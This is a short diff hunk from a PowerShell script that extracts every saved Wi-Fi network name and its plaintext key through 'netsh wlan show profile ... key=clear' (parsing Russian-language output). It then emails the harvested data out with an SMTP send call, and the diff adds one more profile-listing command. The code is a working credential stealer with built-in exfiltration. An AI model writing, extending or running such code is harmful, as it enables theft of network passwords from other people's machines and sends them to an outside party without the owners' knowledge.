@@ -58,6 +58,7 @@ $ff = ((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$n=$_.Matches.Gr
 $ff
 $ff1 = ((netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize)
 $ff1
+netsh wlan show profiles
 $ReportEmail.Body = $ff
 $SMTPInfo.Send($ReportEmail)
 
